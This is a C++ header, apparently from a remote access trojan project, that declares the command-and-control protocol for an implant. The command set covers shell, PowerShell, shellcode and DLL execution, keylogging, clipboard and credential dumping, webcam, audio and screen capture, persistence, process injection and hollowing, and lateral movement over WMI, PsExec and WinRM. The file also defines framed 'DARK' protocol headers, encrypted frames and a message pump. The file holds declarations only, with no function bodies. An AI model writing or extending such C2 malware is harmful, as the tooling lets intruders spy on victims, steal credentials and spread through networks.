#pragma once
#include <diarna/compiler_port.hpp>
#include <cstdint>
#include <vector>
#include <span>
#include <string>
#include <functional>
#include <atomic>
#include <mutex>
#include <queue>
#include <chrono>
#include <thread>
#include <condition_variable>

namespace diarna::comm {

enum class CommandType : uint16_t {
    HEARTBEAT = 0x0001,
    EXEC_CMD = 0x0100,
    EXEC_PS = 0x0101,
    EXEC_SHELLCODE = 0x0102,
    EXEC_DLL = 0x0103,

    FS_LIST = 0x0200,
    FS_READ = 0x0201,
    FS_WRITE = 0x0202,
    FS_DELETE = 0x0203,
    FS_DOWNLOAD = 0x0204,
    FS_UPLOAD = 0x0205,

    SCREENSHOT = 0x0300,
    AUDIO_CAPTURE = 0x0301,
    WEBCAM_CAPTURE = 0x0302,
    DESKTOP_STREAM = 0x0303,
    STOP_STREAM = 0x0304,

    KEYLOG_DUMP = 0x0400,
    CLIPBOARD_DUMP = 0x0401,
    CREDS_DUMP = 0x0402,

    PERSIST_INSTALL = 0x0500,
    PERSIST_REMOVE = 0x0501,
    PERSIST_STATUS = 0x0502,

    INJECT_SHELLCODE = 0x0600,
    INJECT_DLL = 0x0601,
    HOLLOW_PROCESS = 0x0602,

    NETWORK_SCAN = 0x0700,
    LATERAL_WMI = 0x0701,
    LATERAL_PSX = 0x0702,
    LATERAL_WINRM = 0x0703,

    SYSINFO = 0x0800,
    SELF_DESTRUCT = 0x0801,
    UPDATE_CONFIG = 0x0802,
    SLEEP = 0x0803,
    CONFIG = 0x0804,

    RESPONSE = 0x8000,
    CMD_ERROR = 0xFFFF
};

#pragma pack(push, 1)
struct ProtocolHeader {
    uint32_t magic;          // 0x4441524B ("DARK")
    uint16_t version;        // Protocol version
    CommandType command;
    uint32_t sequence;
    uint32_t payload_size;
    uint32_t checksum;       // CRC32 of payload
    uint8_t flags;
    uint8_t padding[3];
};

struct FrameHeader {
    uint32_t frame_id;
    uint32_t total_frames;
    uint32_t frame_size;
    uint32_t offset;
};
#pragma pack(pop)

static inline uint32_t derive_magic(const std::string& agent_id, std::span<const uint8_t, 8> key_prefix) {
    uint32_t h = 0x811C9DC5;
    for (char c : agent_id) { h ^= (uint8_t)c; h *= 0x01000193; }
    for (uint8_t b : key_prefix) { h ^= b; h = (h << 13) | (h >> 19); }
    return h;
}

static constexpr uint16_t PROTOCOL_VERSION = 2;

class C2Protocol {
public:
    C2Protocol();
    ~C2Protocol();

    using CommandHandler = std::function<std::vector<uint8_t>(
        CommandType cmd, std::span<const uint8_t> payload)>;

    void set_handler(CommandHandler handler);

    std::vector<uint8_t> pack_message(CommandType cmd,
                                       std::span<const uint8_t> payload,
                                       uint32_t sequence);
    bool unpack_message(std::span<const uint8_t> data,
                        CommandType& cmd, uint32_t& sequence,
                        std::vector<uint8_t>& payload);

    std::vector<uint8_t> encrypt_frame(std::span<const uint8_t> data,
                                         std::span<const uint8_t, 12> nonce);
    std::vector<uint8_t> decrypt_frame(std::span<const uint8_t> data,
                                         std::span<const uint8_t, 12> nonce);

    void set_encryption_key(std::span<const uint8_t, 32> key);
    void set_session_magic(const std::string& agent_id, std::span<const uint8_t, 8> prefix);

    struct ProtocolStats {
        uint64_t messages_sent;
        uint64_t messages_received;
        uint64_t bytes_sent;
        uint64_t bytes_received;
        uint64_t decrypt_errors;
        uint64_t invalid_checksum;
    };
    ProtocolStats stats() const;

public:
    bool has_handler() const { return static_cast<bool>(handler_); }
    CommandHandler& get_handler() { return handler_; }

private:
    CommandHandler handler_;
    std::vector<uint8_t> encryption_key_;
    std::mutex stats_mutex_;
    ProtocolStats stats_;
    uint32_t sequence_counter_ = 0;
    uint32_t session_magic_ = 0;

    uint32_t crc32(std::span<const uint8_t> data);
    std::vector<std::vector<uint8_t>> fragment(std::span<const uint8_t> data,
                                                size_t max_size = 65536);
};

class MessagePump {
public:
    MessagePump();
    ~MessagePump();

    using Sender = std::function<bool(std::span<const uint8_t>)>;
    using Receiver = std::function<std::vector<uint8_t>(int timeout_ms)>;

    void start(Sender sender, Receiver receiver);
    void stop();

    bool send(CommandType cmd, std::span<const uint8_t> payload);
    void set_command_handler(C2Protocol::CommandHandler handler);

    bool is_connected() const;

private:
    C2Protocol protocol_;
    std::atomic<bool> running_{false};
    std::atomic<bool> connected_{false};
    std::thread send_thread_;
    std::thread recv_thread_;
    Sender sender_;
    Receiver receiver_;
    std::queue<std::pair<CommandType, std::vector<uint8_t>>> send_queue_;
    std::mutex queue_mutex_;
    std::condition_variable queue_cv_;
    uint32_t seq_ = 0;
};

} // namespace diarna::comm
